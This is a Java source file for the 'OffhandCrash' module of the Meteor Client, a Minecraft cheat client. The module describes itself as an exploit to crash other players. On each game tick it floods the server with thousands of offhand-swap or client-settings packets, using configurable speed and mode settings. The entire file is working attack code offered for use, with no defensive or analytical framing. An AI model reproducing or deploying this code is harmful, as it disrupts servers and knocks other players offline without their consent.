/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client/).
 * Copyright (c) 2021 Meteor Development.
 */

package minegame159.meteorclient.modules.misc;

import io.netty.channel.Channel;
import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.events.world.TickEvent;
import minegame159.meteorclient.mixin.ClientConnectionAccessor;
import minegame159.meteorclient.mixin.GameOptionsAccessor;
import minegame159.meteorclient.modules.Categories;
import minegame159.meteorclient.modules.Module;
import minegame159.meteorclient.settings.*;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.options.Option;
import net.minecraft.client.render.entity.PlayerModelPart;
import net.minecraft.network.Packet;
import net.minecraft.network.packet.c2s.play.ClientSettingsC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

import java.util.Iterator;

public class OffhandCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Boolean> doCrash = sgGeneral.add(new BoolSetting.Builder()
            .name("do-crash")
            .description("Sends X number of offhand swap sound packets to the server per tick.")
            .defaultValue(true)
            .build()
    );

    private final Setting<Integer> speed = sgGeneral.add(new IntSetting.Builder()
            .name("speed")
            .description("The amount of swaps measured in ticks.")
            .defaultValue(2000)
            .min(1)
            .sliderMax(10000)
            .build()
    );

    private final Setting<Boolean> antiCrash = sgGeneral.add(new BoolSetting.Builder()
            .name("anti-crash")
            .description("Attempts to prevent you from crashing yourself.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
            .name("mode")
            .description("Which method should be used for crashing.")
            .defaultValue(Mode.SWAP_MAIN_AND_OFFHAND)
            .build()
    );

    public OffhandCrash() {
        super(Categories.Misc, "offhand-crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand..");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (doCrash.get()) {
            Channel channel = ((ClientConnectionAccessor) mc.player.networkHandler.getConnection()).getChannel();
            for (int i = 0; i < speed.get(); ++i) {
                channel.write(Mode.get(mode.get()));
            }
            channel.flush();
        }
    }

    public boolean isAntiCrash() {
        return isActive() && antiCrash.get();
    }

    public enum Mode {
        SWAP_MAIN_AND_OFFHAND,
        CHANGE_DOMINANT_HAND;

        private static final PlayerActionC2SPacket PLAYER_ACTION_C_2_S_PACKET = new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, new BlockPos(0, 0, 0), Direction.UP);
        private static final ClientSettingsC2SPacket CLIENT_SETTINGS_C_2_S_PACKET;
        private static final ClientSettingsC2SPacket CLIENT_SETTINGS_C_2_S_PACKET_2;

        static {
            Option.MAIN_HAND.cycle(MinecraftClient.getInstance().options, 1);

            int i = 0;
            PlayerModelPart playerModelPart;
            for (Iterator iterator = ((GameOptionsAccessor) MinecraftClient.getInstance().options).getEnabledPlayerModelParts().iterator(); iterator.hasNext(); i |= playerModelPart.getBitFlag()) {
                playerModelPart = (PlayerModelPart) iterator.next();
            }

            CLIENT_SETTINGS_C_2_S_PACKET = new ClientSettingsC2SPacket(MinecraftClient.getInstance().options.language,
                    MinecraftClient.getInstance().options.viewDistance,
                    MinecraftClient.getInstance().options.chatVisibility,
                    MinecraftClient.getInstance().options.chatColors,
                    i,
                    MinecraftClient.getInstance().options.mainArm);
            Option.MAIN_HAND.cycle(MinecraftClient.getInstance().options, 1);

            int j = 0;
            PlayerModelPart playerModelPart1;
            for (Iterator iterator = ((GameOptionsAccessor) MinecraftClient.getInstance().options).getEnabledPlayerModelParts().iterator(); iterator.hasNext(); j |= playerModelPart1.getBitFlag()) {
                playerModelPart1 = (PlayerModelPart) iterator.next();
            }

            CLIENT_SETTINGS_C_2_S_PACKET_2 = new ClientSettingsC2SPacket(MinecraftClient.getInstance().options.language,
                    MinecraftClient.getInstance().options.viewDistance,
                    MinecraftClient.getInstance().options.chatVisibility,
                    MinecraftClient.getInstance().options.chatColors,
                    j,
                    MinecraftClient.getInstance().options.mainArm);
        }

        private static boolean swap = false;

        public static Packet<?> get(Mode mode) {
            if (mode == SWAP_MAIN_AND_OFFHAND) {
                return PLAYER_ACTION_C_2_S_PACKET;
            } else {
                swap = !swap;
                return swap ? CLIENT_SETTINGS_C_2_S_PACKET : CLIENT_SETTINGS_C_2_S_PACKET_2;
            }
        }

        @Override
        public String toString() {
            final String name = this.name();
            return (name.charAt(0) +
                    name.toLowerCase()
                            .substring(1))
                    .replace("_", " ");
        }
    }
}